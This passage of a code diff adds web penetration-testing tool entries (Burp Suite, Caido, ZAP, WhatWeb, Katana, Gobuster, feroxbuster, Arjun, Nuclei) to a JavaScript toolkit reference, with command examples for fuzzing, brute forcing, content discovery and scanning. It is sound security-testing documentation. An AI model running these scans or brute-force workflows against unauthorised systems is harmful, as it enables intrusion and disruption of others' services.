@@ -3971,6 +3971,1359 @@ var TOOLKIT = [
             ]
           }
         ]
+      },
+      {
+        id: "burpsuite",
+        name: "Burp Suite",
+        url: "https://portswigger.net/burp",
+        description: "The industry-standard intercepting proxy and web application testing platform.",
+        brief: "Burp Suite is the tool most web application testing is actually done in. At its core it is an intercepting proxy that sits between your browser and the target, letting you view, modify, and replay every request. Around that core sits a suite of modules — Repeater for manual request tinkering, Intruder for automated attacks, Scanner (Pro) for automated vulnerability discovery, and an extension ecosystem via the BApp store.\n\nThe free Community Edition covers the manual workflow that matters most for learning; the Professional edition adds the automated scanner, unthrottled Intruder, and the extensions that depend on them.",
+        quickReference: [
+          { label: "Proxy your browser", cmd: "Set browser proxy to 127.0.0.1:8080, install Burp's CA cert" },
+          { label: "Intercept and edit a request", cmd: "Proxy tab -> Intercept is on -> edit -> Forward" },
+          { label: "Send a request for manual testing", cmd: "Right-click a request -> Send to Repeater (Ctrl+R)" },
+          { label: "Automate parameter attacks", cmd: "Right-click -> Send to Intruder (Ctrl+I) -> mark positions -> set payloads" },
+          { label: "Built-in browser (no proxy setup)", cmd: "Proxy tab -> Open Browser" }
+        ],
+        sections: [
+          {
+            title: "Core Modules",
+            type: "table",
+            columns: ["Module", "Purpose"],
+            rows: [
+              ["Proxy", "Intercept, view, and modify traffic between browser and target — the heart of the tool"],
+              ["Repeater", "Manually resend and tweak a single request over and over — the manual-testing workhorse"],
+              ["Intruder", "Automate a request with payload sets — fuzzing, brute forcing, enumeration"],
+              ["Scanner (Pro)", "Automated active and passive vulnerability scanning"],
+              ["Sequencer", "Analyse randomness of tokens (session IDs, CSRF tokens)"],
+              ["Decoder", "Encode/decode data — URL, Base64, hex, HTML, and more"],
+              ["Comparer", "Diff two requests or responses to spot subtle differences"],
+              ["Target / Site map", "The crawled structure of the application and its scope"]
+            ]
+          },
+          {
+            title: "Intruder Attack Types",
+            type: "table",
+            columns: ["Type", "Behaviour"],
+            rows: [
+              ["Sniper", "One payload set, one position at a time — the default for testing a single parameter"],
+              ["Battering ram", "One payload set placed into all positions simultaneously"],
+              ["Pitchfork", "Multiple payload sets in parallel (payload 1 in pos 1, payload 2 in pos 2)"],
+              ["Cluster bomb", "Every combination of multiple payload sets — for username/password pairs"]
+            ]
+          },
+          {
+            title: "Essential Extensions (BApp Store)",
+            type: "table",
+            columns: ["Extension", "What it adds"],
+            rows: [
+              ["Autorize", "Automated authorization/access-control testing — replay requests as a low-priv user"],
+              ["Logger++", "A powerful, filterable log of all traffic across tools"],
+              ["Active Scan++", "Extends the scanner's checks"],
+              ["Param Miner", "Discovers hidden parameters and headers (cache poisoning, HTTP smuggling)"],
+              ["JWT Editor", "Inspect and attack JSON Web Tokens inline"],
+              ["Turbo Intruder", "Extremely fast, scriptable request sending — race conditions, huge fuzzing"],
+              ["Collaborator Everywhere", "Injects out-of-band payloads to catch blind vulnerabilities (Pro)"]
+            ]
+          },
+          {
+            title: "Match & Replace / Workflow Tips",
+            type: "table",
+            columns: ["Feature", "Use"],
+            rows: [
+              ["Scope", "Set target scope early so tools and logging ignore noise from third-party domains"],
+              ["Match and Replace", "Automatically rewrite headers/bodies on the fly (e.g. inject a header on every request)"],
+              ["Session handling rules", "Automate re-authentication and CSRF token handling during automated attacks"],
+              ["Save/restore project", "Persist an engagement's traffic and findings (Pro saves to disk incrementally)"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Manual test of a single request", cmd: "1. Browse the feature through Burp's proxy\n2. Find the request in Proxy > HTTP history\n3. Send to Repeater (Ctrl+R)\n4. Modify one thing at a time, resend, compare responses" },
+              { label: "Brute force / fuzz a parameter", cmd: "1. Send the request to Intruder (Ctrl+I)\n2. Clear positions, mark just the target parameter\n3. Choose Sniper, load a payload list\n4. Start attack, sort results by status/length to spot anomalies" },
+              { label: "Access control testing", cmd: "1. Log in as a high-priv user, map the app\n2. Install Autorize, set a low-priv session cookie\n3. Re-browse — Autorize flags any request the low-priv user should NOT be able to make" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Community Edition is enough to learn the manual workflow — Proxy, Repeater, and Intruder (throttled). The Scanner and unthrottled Intruder are the main Pro upgrades.",
+              "Set your target scope before anything else; it keeps the site map, history, and scanner focused and stops you touching out-of-scope third parties.",
+              "Repeater is where real understanding happens — change one variable, resend, and read the difference. Most findings come from here, not the scanner.",
+              "Install the Burp CA certificate in your browser or HTTPS traffic will throw errors and you will see nothing useful.",
+              "Caido is a lighter, modern alternative with a similar workflow — worth trying if Burp feels heavy."
+            ]
+          }
+        ]
+      },
+      {
+        id: "caido",
+        name: "Caido",
+        url: "https://caido.io/",
+        description: "A modern, lightweight web proxy — a fast alternative to Burp Suite.",
+        brief: "Caido is a newer web security proxy built in Rust, designed to be lighter and faster than Burp while covering the same core workflow: intercept traffic, replay and modify requests, automate attacks, and script the whole thing. Its client/server split means the proxy engine can run on a remote box (a VPS in scope) while you drive it from a local GUI.\n\nIt is increasingly popular for its clean interface, low resource use, and a generous free tier, and its Workflow feature offers a visual way to build request-processing logic without writing an extension.",
+        quickReference: [
+          { label: "Proxy your browser", cmd: "Point browser at Caido's proxy port, install its CA cert" },
+          { label: "Replay a request", cmd: "Right-click a request -> Replay (Caido's Repeater equivalent)" },
+          { label: "Automate an attack", cmd: "Send to Automate -> define payload positions and lists" },
+          { label: "Run remotely", cmd: "Run the caido-cli server on a VPS, connect the desktop client to it" }
+        ],
+        sections: [
+          {
+            title: "Core Features",
+            type: "table",
+            columns: ["Feature", "Purpose"],
+            rows: [
+              ["Intercept", "View and modify requests in flight, like any proxy"],
+              ["Replay", "Caido's Repeater — resend and tweak individual requests"],
+              ["Automate", "Caido's Intruder — payload-driven automated attacks"],
+              ["Workflows", "A visual, node-based pipeline for transforming requests/responses"],
+              ["HTTPQL", "A query language for filtering the traffic history precisely"],
+              ["Findings", "Tag and collect notable requests as you work"],
+              ["Plugins", "A growing extension ecosystem"]
+            ]
+          },
+          {
+            title: "Caido vs Burp",
+            type: "table",
+            columns: ["Aspect", "Note"],
+            rows: [
+              ["Performance", "Rust-based, noticeably lighter on memory and CPU"],
+              ["Client/server split", "The proxy can run remotely (in-scope VPS) while you drive it locally — Burp does not do this natively"],
+              ["Maturity", "Smaller extension ecosystem and fewer advanced modules than Burp Pro today"],
+              ["Learning curve", "Cleaner UI; the concepts map almost one-to-one onto Burp"],
+              ["Pricing", "Generous free tier; paid tiers for teams and advanced features"]
+            ]
+          },
+          {
+            title: "HTTPQL Filtering",
+            type: "table",
+            columns: ["Query", "Matches"],
+            rows: [
+              ["req.method.eq:\"POST\"", "Only POST requests"],
+              ["resp.code.gte:500", "Server errors — often where bugs surface"],
+              ["req.path.cont:\"admin\"", "Requests whose path contains 'admin'"],
+              ["resp.raw.cont:\"error\"", "Responses containing a string"],
+              ["Combine with and/or", "Chain conditions to isolate exactly the traffic you care about"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Standard manual testing", cmd: "1. Proxy the browser through Caido, install the CA cert\n2. Browse the app; filter history with HTTPQL\n3. Right-click an interesting request -> Replay\n4. Tweak and resend, watch the response" },
+              { label: "Remote proxy on an in-scope host", cmd: "# run the server where the engagement expects traffic to originate\ncaido-cli --listen 0.0.0.0:8080\n# connect the desktop client to that server's address" },
+              { label: "Automated parameter fuzzing", cmd: "1. Send a request to Automate\n2. Mark the injection point, attach a payload list\n3. Run, then sort results by status/length for anomalies" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "If you already know Burp, Caido's concepts map almost directly — Replay is Repeater, Automate is Intruder.",
+              "The client/server split is the standout feature: run the proxy on an in-scope VPS so your traffic originates from where the client expects it.",
+              "HTTPQL makes finding the one interesting request in thousands genuinely fast — learn a few operators early.",
+              "The extension ecosystem is smaller than Burp's; check whether a Burp-specific extension you rely on has a Caido equivalent before switching a live engagement."
+            ]
+          }
+        ]
+      },
+      {
+        id: "zap",
+        name: "OWASP ZAP",
+        url: "https://www.zaproxy.org/",
+        description: "Free, open-source web app scanner and proxy — strong for automation and CI.",
+        brief: "ZAP (Zed Attack Proxy) is OWASP's free, open-source web application security scanner. It does the intercepting-proxy job like Burp, but its real strength is automation: a full-featured active and passive scanner, a headless daemon mode, and a scriptable API make it the go-to for baking security testing into CI/CD pipelines.\n\nBecause it is genuinely free and open source — scanner included — it is also the natural starting point for anyone who cannot justify Burp Pro, and a solid second opinion alongside it.",
+        quickReference: [
+          { label: "Automated scan of a target (GUI)", cmd: "Quick Start -> Automated Scan -> enter URL -> Attack" },
+          { label: "Headless baseline scan", cmd: "zap.sh -cmd -quickurl https://target.com -quickout report.html" },
+          { label: "Run as a daemon with API", cmd: "zap.sh -daemon -host 127.0.0.1 -port 8090 -config api.key=<key>" },
+          { label: "Baseline scan via Docker (CI)", cmd: "docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://target.com" }
+        ],
+        sections: [
+          {
+            title: "Scan Types",
+            type: "table",
+            columns: ["Scan", "Behaviour"],
+            rows: [
+              ["Passive scan", "Analyses traffic you generate by browsing — never sends its own attacks, completely safe"],
+              ["Active scan", "Actively sends attack payloads to find vulnerabilities — only against authorised targets"],
+              ["Spider", "Classic crawler that follows links to map the app"],
+              ["AJAX Spider", "Drives a real browser to crawl JavaScript-heavy single-page apps"],
+              ["Fuzzer", "Payload-driven fuzzing of chosen parameters"]
+            ]
+          },
+          {
+            title: "Automation & CI",
+            type: "table",
+            columns: ["Mode", "Use"],
+            rows: [
+              ["zap-baseline.py", "Fast passive scan — ideal as a non-blocking CI gate"],
+              ["zap-full-scan.py", "Adds active scanning for a deeper (slower) CI run"],
+              ["zap-api-scan.py", "Scans an API from an OpenAPI/SOAP/GraphQL definition"],
+              ["Daemon + REST API", "Drive every ZAP function programmatically from any language"],
+              ["Automation Framework", "Define scans as YAML plans for repeatable, version-controlled runs"]
+            ]
+          },
+          {
+            title: "ZAP vs Burp",
+            type: "table",
+            columns: ["Aspect", "Note"],
+            rows: [
+              ["Cost", "Fully free and open source, scanner included — no paid tier"],
+              ["Automation", "Purpose-built for CI/CD; the scripted/headless story is stronger than Burp's out of the box"],
+              ["Manual testing UX", "Serviceable, but Burp's Repeater/Intruder feel smoother to most testers"],
+              ["Best role", "Automated scanning, CI gating, and a free second opinion alongside Burp"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Quick authorised assessment", cmd: "1. GUI > Quick Start > Automated Scan\n2. Enter the URL, run spider + active scan\n3. Read the Alerts tab, triage by risk\n4. Export an HTML report" },
+              { label: "CI security gate", cmd: "# fail the build on new medium+ issues\ndocker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py \\\n  -t https://staging.target.com -r zap_report.html" },
+              { label: "Scan an API from its spec", cmd: "docker run -t ghcr.io/zaproxy/zaproxy zap-api-scan.py \\\n  -t https://target.com/openapi.json -f openapi" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Passive scanning is completely safe — it only analyses traffic you generate. Active scanning sends real attacks and needs authorisation.",
+              "ZAP's automation and API are its edge over Burp; if you want security testing in a pipeline, start here.",
+              "The AJAX Spider (real-browser crawling) is essential for single-page apps that the classic spider cannot map.",
+              "Run it alongside Burp rather than instead of it — the two scanners flag different things, and ZAP costs nothing.",
+              "Tune the scan policy before an active scan; the defaults can be noisy and slow on large apps."
+            ]
+          }
+        ]
+      },
+      {
+        id: "whatweb",
+        name: "WhatWeb",
+        url: "https://github.com/urbanadventurer/WhatWeb",
+        description: "Fingerprints web technologies — CMS, frameworks, servers, and versions.",
+        brief: "WhatWeb identifies what a website is built with. It sends requests and matches the responses against 1800+ plugins to recognise content management systems, web frameworks, JavaScript libraries, analytics, servers, and — where exposed — their versions. Knowing the stack is the first step of any web assessment, because it tells you which specific attacks and known CVEs are even relevant.\n\nIt runs at adjustable aggression levels, from a single passive request to active probing, so you can trade stealth against detail.",
+        quickReference: [
+          { label: "Fingerprint a site", cmd: "whatweb https://target.com" },
+          { label: "Verbose, show every detail", cmd: "whatweb -v https://target.com" },
+          { label: "Scan a list of hosts", cmd: "whatweb -i hosts.txt --log-brief=results.txt" },
+          { label: "Turn up aggression for versions", cmd: "whatweb -a 3 https://target.com" }
+        ],
+        sections: [
+          {
+            title: "Aggression Levels",
+            type: "table",
+            columns: ["Level", "Behaviour"],
+            rows: [
+              ["-a 1 (Stealthy)", "One HTTP request per target — passive, quiet, least detail"],
+              ["-a 2 (Unused)", "Reserved; rarely used"],
+              ["-a 3 (Aggressive)", "A few extra requests to confirm and extract versions — the usual choice"],
+              ["-a 4 (Heavy)", "Many requests, most thorough, loudest"]
+            ]
+          },
+          {
+            title: "Useful Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-v", "Verbose — show the evidence behind each match"],
+              ["-i <file>", "Read targets from a file"],
+              ["--log-brief / --log-verbose / --log-json", "Write results in various formats"],
+              ["-U <agent>", "Set a custom User-Agent"],
+              ["--max-threads <n>", "Concurrency for list scans"],
+              ["-p <plugins>", "Run only specific plugins"]
+            ]
+          },
+          {
+            title: "What It Detects",
+            type: "table",
+            columns: ["Category", "Examples"],
+            rows: [
+              ["CMS", "WordPress, Drupal, Joomla — often with version, which feeds a targeted scanner"],
+              ["Frameworks", "Laravel, Django, Rails, Express, Spring"],
+              ["Servers", "nginx, Apache, IIS, plus versions from headers"],
+              ["Front-end", "jQuery, React, Vue, Bootstrap and their versions"],
+              ["Infrastructure", "CDNs, WAFs, load balancers, analytics, cloud providers"],
+              ["Interesting headers", "Security headers present or absent, framework leakage"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Fingerprint, then pick the right tool", cmd: "whatweb -a 3 -v https://target.com\n# WordPress detected -> run wpscan next\n# specific framework version -> search it for known CVEs" },
+              { label: "Bulk-fingerprint discovered subdomains", cmd: "whatweb -i subdomains.txt --log-json=stack.json --max-threads 25\n# then group hosts by technology to plan the assessment" },
+              { label: "Feed httpx-discovered hosts", cmd: "cat live_hosts.txt | while read u; do whatweb -a 1 \"$u\"; done" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Level 1 is passive (one request) and safe for reconnaissance; level 3 is the sweet spot when you want versions and are authorised to probe.",
+              "A detected CMS is a signpost — WordPress sends you to wpscan, a framework version sends you to a CVE search.",
+              "Browser extensions like Wappalyzer do the same fingerprinting interactively while you browse; WhatWeb is the scriptable, bulk version.",
+              "Version numbers are the payoff: an exact framework/server version turns a broad assessment into a targeted one.",
+              "Combine with Nuclei's technology templates for automated follow-up on what WhatWeb identifies."
+            ]
+          }
+        ]
+      },
+      {
+        id: "katana",
+        name: "Katana",
+        url: "https://github.com/projectdiscovery/katana",
+        description: "Fast crawler that maps endpoints and parameters, including JavaScript-rendered ones.",
+        brief: "Katana is ProjectDiscovery's crawler, built to enumerate a web application's URLs, endpoints, and parameters quickly and feed them into the rest of a pipeline. It has two modes: a fast standard crawler and a headless mode that drives a real browser to reach the routes and endpoints that only appear after JavaScript runs — which is most of the modern web.\n\nIt is the discovery stage that turns a single domain into a full list of testable endpoints for fuzzing, scanning, and manual review.",
+        quickReference: [
+          { label: "Crawl a target", cmd: "katana -u https://target.com" },
+          { label: "Headless crawl (JS-rendered)", cmd: "katana -u https://target.com -headless" },
+          { label: "Crawl and keep parameters", cmd: "katana -u https://target.com -jc -kf all -o endpoints.txt" },
+          { label: "Passive crawl from archives", cmd: "katana -u https://target.com -passive" }
+        ],
+        sections: [
+          {
+            title: "Crawl Modes",
+            type: "table",
+            columns: ["Flag", "Behaviour"],
+            rows: [
+              ["(default)", "Standard fast crawler using the HTTP engine"],
+              ["-headless", "Drives a real Chromium to capture JavaScript-rendered routes and XHR endpoints"],
+              ["-passive", "Pulls URLs from sources like the Wayback Machine and Common Crawl — no requests to target"],
+              ["-jc / -jsl", "Parse JavaScript files for endpoints and crawl/scrape them"]
+            ]
+          },
+          {
+            title: "Scope & Depth",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-d <n>", "Maximum crawl depth"],
+              ["-fs <scope>", "Field scope: fqdn, rdn (root domain), or dn — how far off-host to wander"],
+              ["-kf <fields>", "Known files to fetch (robots.txt, sitemap.xml)"],
+              ["-cs / -crawl-scope", "Regex to include only matching URLs"],
+              ["-do / -crawl-out-scope", "Regex to exclude URLs (logout, etc.)"],
+              ["-c <n> / -p <n>", "Concurrency and parallelism"]
+            ]
+          },
+          {
+            title: "Output & Filtering",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-o <file>", "Write results to a file"],
+              ["-jsonl", "JSON Lines output with full request detail"],
+              ["-f <field>", "Output only a field: url, path, qurl (URLs with params), etc."],
+              ["-em / -ef <ext>", "Match or filter by extension"],
+              ["-silent", "URLs only, clean for piping"],
+              ["-mdc <filter>", "Match on DSL conditions (status, content type)"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Full endpoint discovery pipeline", cmd: "katana -u https://target.com -headless -jc -kf all -silent \\\n  | tee endpoints.txt\n# parameterised URLs feed fuzzing:\ngrep '?' endpoints.txt | sort -u > params.txt" },
+              { label: "Feed a vulnerability scan", cmd: "katana -u https://target.com -silent | nuclei -t http/ -severity medium,high,critical" },
+              { label: "Combine with archive URLs", cmd: "katana -u https://target.com -passive -silent > archive_urls.txt\nkatana -u https://target.com -headless -silent > live_urls.txt\nsort -u archive_urls.txt live_urls.txt > all_endpoints.txt" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Headless mode is essential for single-page apps — the standard crawler cannot see routes that only exist after JavaScript executes.",
+              "Use -jc to parse JavaScript files; modern apps hide most of their API endpoints in bundled JS, not in HTML links.",
+              "Set an out-of-scope regex for logout and destructive links, or an authenticated crawl will log itself out or delete data.",
+              "It is built to pipe: katana -> httpx -> nuclei is a standard discovery-to-scan chain.",
+              "The passive mode overlaps with gau/waybackurls — combine them for the widest endpoint set."
+            ]
+          }
+        ]
+      },
+      {
+        id: "gobuster",
+        name: "Gobuster",
+        url: "https://github.com/OJ/gobuster",
+        description: "Fast brute-forcer for directories, DNS subdomains, vhosts, and more.",
+        brief: "Gobuster is a fast, Go-based brute-forcing tool with several modes: it discovers hidden directories and files on a web server, enumerates DNS subdomains, finds virtual hosts, and more. It is the classic content-discovery step — throw a wordlist at a target and find the admin panels, backup files, and API paths that are not linked from anywhere.\n\nIt is simple, fast, and does one job per mode well, which is why it remains a default even alongside newer tools like feroxbuster and ffuf.",
+        quickReference: [
+          { label: "Directory/file discovery", cmd: "gobuster dir -u https://target.com -w wordlist.txt" },
+          { label: "With extensions", cmd: "gobuster dir -u https://target.com -w wordlist.txt -x php,txt,bak" },
+          { label: "DNS subdomain enumeration", cmd: "gobuster dns -d target.com -w subdomains.txt" },
+          { label: "Virtual host discovery", cmd: "gobuster vhost -u https://target.com -w subdomains.txt --append-domain" }
+        ],
+        sections: [
+          {
+            title: "Modes",
+            type: "table",
+            columns: ["Mode", "Purpose"],
+            rows: [
+              ["dir", "Brute-force directories and files on a web server"],
+              ["dns", "Enumerate subdomains via DNS resolution"],
+              ["vhost", "Discover virtual hosts sharing an IP by fuzzing the Host header"],
+              ["fuzz", "Generic FUZZ-keyword fuzzing, ffuf-style"],
+              ["s3 / gcs", "Enumerate open cloud storage buckets"],
+              ["tftp", "Enumerate files on a TFTP server"]
+            ]
+          },
+          {
+            title: "Directory Mode Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-w <wordlist>", "Wordlist to use — required"],
+              ["-x <exts>", "Append extensions to each word (php, html, bak, txt)"],
+              ["-t <n>", "Number of concurrent threads (default 10)"],
+              ["-s / -b", "Status codes to include / blacklist"],
+              ["-k", "Skip TLS certificate verification"],
+              ["-c <cookies>", "Send cookies (for authenticated discovery)"],
+              ["-H <header>", "Add a custom header, repeatable"],
+              ["-r", "Follow redirects"]
+            ]
+          },
+          {
+            title: "Tuning & Accuracy",
+            type: "table",
+            columns: ["Concept", "Description"],
+            rows: [
+              ["Wildcard responses", "If every path returns 200, use -b or --exclude-length to filter the catch-all"],
+              ["--exclude-length <n>", "Drop responses of a specific size — the false-positive killer"],
+              ["Extensions matter", "Always add -x for the stack (php for PHP apps, aspx for .NET)"],
+              ["Wordlist choice", "SecLists Discovery/Web-Content is the standard source; size the list to your time budget"],
+              ["Rate/threads", "Raise -t for speed, lower it if you trip a WAF or rate limit"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Standard content discovery", cmd: "gobuster dir -u https://target.com \\\n  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\\n  -x php,txt,bak,old -t 50 -o gobuster.txt" },
+              { label: "Kill false positives", cmd: "# note the catch-all response size first, then:\ngobuster dir -u https://target.com -w list.txt --exclude-length 1234" },
+              { label: "Subdomain enumeration", cmd: "gobuster dns -d target.com \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\\n  -t 50 -o subs.txt" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Always add extensions with -x that match the target's stack — discovering index.php requires telling gobuster to try .php.",
+              "Handle wildcard/catch-all responses with --exclude-length, or your results will be a wall of false 200s.",
+              "feroxbuster adds automatic recursion and ffuf adds more flexible fuzzing; gobuster wins on simplicity and raw speed for a flat scan.",
+              "For authenticated discovery, pass the session cookie with -c so you enumerate the post-login surface.",
+              "SecLists is the wordlist source — see the Wordlists section of this toolkit."
+            ]
+          }
+        ]
+      },
+      {
+        id: "feroxbuster",
+        name: "feroxbuster",
+        url: "https://github.com/epi052/feroxbuster",
+        description: "Recursive content discovery scanner — fast, with automatic directory recursion.",
+        brief: "feroxbuster is a Rust-based content-discovery tool whose defining feature is automatic recursion: when it finds a directory, it dives into it and keeps fuzzing, building out the full tree without you re-running the tool for each level. It is fast, has smart automatic filtering to suppress false positives, and can resume interrupted scans.\n\nWhere gobuster gives you a flat scan of one directory, feroxbuster gives you the whole structure in one command, which is why many testers reach for it first on an unfamiliar app.",
+        quickReference: [
+          { label: "Recursive discovery", cmd: "feroxbuster -u https://target.com -w wordlist.txt" },
+          { label: "With extensions", cmd: "feroxbuster -u https://target.com -w wordlist.txt -x php,txt,bak" },
+          { label: "Control recursion depth", cmd: "feroxbuster -u https://target.com -w wordlist.txt -d 2" },
+          { label: "Filter out a response size", cmd: "feroxbuster -u https://target.com -w wordlist.txt -S 1234" }
+        ],
+        sections: [
+          {
+            title: "Key Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-u <url>", "Target URL"],
+              ["-w <wordlist>", "Wordlist"],
+              ["-x <exts>", "Extensions to append"],
+              ["-d <n>", "Maximum recursion depth (default 4; 1 disables recursion)"],
+              ["-t <n>", "Concurrent threads"],
+              ["-r", "Follow redirects"],
+              ["-k", "Skip TLS verification"],
+              ["--resume-from <file>", "Resume a previously interrupted scan"]
+            ]
+          },
+          {
+            title: "Filtering (False-Positive Control)",
+            type: "table",
+            columns: ["Flag", "Filters out responses by"],
+            rows: [
+              ["-S <size>", "Content length / size"],
+              ["-C <code>", "Status code"],
+              ["-W <words>", "Word count"],
+              ["-N <lines>", "Line count"],
+              ["--filter-regex <re>", "A regex match in the body"],
+              ["--auto-tune / --auto-bail", "Automatically adjust to rate limits or bail on too many errors"]
+            ]
+          },
+          {
+            title: "Recursion Behaviour",
+            type: "table",
+            columns: ["Concept", "Description"],
+            rows: [
+              ["Automatic recursion", "Any discovered directory is queued and fuzzed automatically"],
+              ["-d depth", "Caps how deep it goes; on a large app start shallow to avoid an explosion"],
+              ["--dont-scan <re>", "Exclude paths from recursion (logout, huge static dirs)"],
+              ["Force/prevent per-dir", "Interactive controls let you add or skip directories mid-scan"],
+              ["Scan time", "Grows fast with depth x wordlist size — tune both deliberately"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Recursive discovery with sane limits", cmd: "feroxbuster -u https://target.com \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -x php,html,txt -d 2 -t 100 -o ferox.txt" },
+              { label: "Tame a noisy target", cmd: "# find the catch-all size, filter it, and auto-tune to rate limits\nferoxbuster -u https://target.com -w list.txt -S 0 --auto-tune" },
+              { label: "Resume after interruption", cmd: "# feroxbuster writes state; pick up where it stopped\nferoxbuster --resume-from ferox.state" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Automatic recursion is the reason to use it — but cap depth with -d on a large app or the scan explodes combinatorially.",
+              "Its automatic filtering suppresses many false positives out of the box; add -S/-C/-W manually when a catch-all slips through.",
+              "Use --dont-scan to skip logout links and enormous static directories that would waste hours.",
+              "It resumes interrupted scans, which matters on slow or flaky targets — save the state file.",
+              "gobuster, feroxbuster, and ffuf overlap; feroxbuster's niche is effortless full-tree recursion."
+            ]
+          }
+        ]
+      },
+      {
+        id: "arjun",
+        name: "Arjun",
+        url: "https://github.com/s0md3v/Arjun",
+        description: "Discovers hidden HTTP parameters an endpoint secretly accepts.",
+        brief: "Arjun finds query and body parameters that an endpoint processes but does not advertise. Applications frequently accept parameters that appear nowhere in the HTML or JavaScript — debug flags, admin toggles, hidden filters, legacy inputs — and those undocumented parameters are exactly where access-control and injection bugs hide. Arjun fuzzes a large wordlist of likely names and infers which ones the endpoint actually reacts to.\n\nIt works by sending requests and detecting meaningful changes in the response (length, status, content), so it finds parameters that change behaviour even when nothing links to them.",
+        quickReference: [
+          { label: "Find GET parameters", cmd: "arjun -u https://target.com/page" },
+          { label: "Test POST parameters", cmd: "arjun -u https://target.com/api -m POST" },
+          { label: "JSON body parameters", cmd: "arjun -u https://target.com/api -m JSON" },
+          { label: "Import a request from Burp", cmd: "arjun --import request.txt" }
+        ],
+        sections: [
+          {
+            title: "Methods & Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-u <url>", "Target endpoint"],
+              ["-m <method>", "Method to test: GET, POST, JSON, XML"],
+              ["-w <wordlist>", "Custom parameter wordlist (defaults to a large built-in list)"],
+              ["-i <file>", "Test multiple URLs from a file"],
+              ["--import <file>", "Start from a raw request (e.g. exported from Burp)"],
+              ["-oJ / -oT", "JSON or text output"],
+              ["-t <n>", "Concurrency"],
+              ["--stable", "Slower but more reliable detection on inconsistent responses"]
+            ]
+          },
+          {
+            title: "How Detection Works",
+            type: "table",
+            columns: ["Concept", "Description"],
+            rows: [
+              ["Baseline first", "Arjun learns the normal response, then looks for deviations when a parameter is added"],
+              ["Reflection", "A parameter whose value appears in the response is a strong hit"],
+              ["Behaviour change", "Status code, length, or content shifts reveal a parameter the app acts on"],
+              ["Bucketing", "It sends parameters in batches, then binary-searches the batch that caused a change"],
+              ["Rate handling", "--stable trades speed for reliability where responses are noisy"]
+            ]
+          },
+          {
+            title: "Why Hidden Parameters Matter",
+            type: "table",
+            columns: ["Hidden parameter", "Potential impact"],
+            rows: [
+              ["debug / test / admin", "Toggles that expose stack traces, bypass checks, or unlock features"],
+              ["Access-control params", "id, user, account — IDOR and privilege bypass"],
+              ["Injection sinks", "An unlinked parameter passed to SQL, a command, or a template"],
+              ["Legacy inputs", "Old parameters still wired up but no longer validated"],
+              ["Feature flags", "Server-side toggles never meant to be client-controllable"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Discover then test", cmd: "arjun -u https://target.com/search -oT params.txt\n# feed found params into a fuzzer / manual testing:\n# ffuf, sqlmap, or dalfox against each discovered parameter" },
+              { label: "Test an API endpoint from a captured request", cmd: "# export the request from Burp, then:\narjun --import request.txt -m JSON -oJ found.json" },
+              { label: "Bulk across discovered endpoints", cmd: "arjun -i endpoints.txt -oT all_params.txt -t 20" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Hidden parameters are one of the highest-value discoveries in web testing — they are unlinked, so they are often unvalidated.",
+              "Match the method to the endpoint: an API that takes JSON will not reveal parameters tested as GET query strings.",
+              "Use --stable on endpoints with noisy or inconsistent responses, or you will get false positives and negatives.",
+              "Every parameter Arjun finds is a new input to test — pipe them straight into sqlmap, dalfox, or manual review.",
+              "Import real requests from Burp so cookies, headers, and auth are preserved during discovery."
+            ]
+          }
+        ]
+      },
+      {
+        id: "nuclei",
+        name: "Nuclei",
+        url: "https://github.com/projectdiscovery/nuclei",
+        description: "Template-based vulnerability scanner driven by a huge community template library.",
+        brief: "Nuclei is a fast, template-driven vulnerability scanner. Instead of hardcoded checks, it runs YAML templates that each describe how to detect one specific issue — a CVE, an exposed panel, a misconfiguration, a default credential. A community library of thousands of templates is maintained and updated constantly, so the moment a new CVE gets a template, you can scan for it everywhere.\n\nThat model is its power: it is essentially a distributed detection engine where the detection logic is shared, versioned, and trivially extensible. Point it at a host list and it tells you which known issues actually apply.",
+        quickReference: [
+          { label: "Scan a target with all templates", cmd: "nuclei -u https://target.com" },
+          { label: "Scan a list of hosts", cmd: "nuclei -l hosts.txt" },
+          { label: "Only high/critical", cmd: "nuclei -l hosts.txt -severity high,critical" },
+          { label: "Specific template tags", cmd: "nuclei -u https://target.com -tags cve,exposure" },
+          { label: "Update templates", cmd: "nuclei -update-templates" }
+        ],
+        sections: [
+          {
+            title: "Template Selection",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-t <path>", "Run specific templates or a template directory (e.g. http/cves/)"],
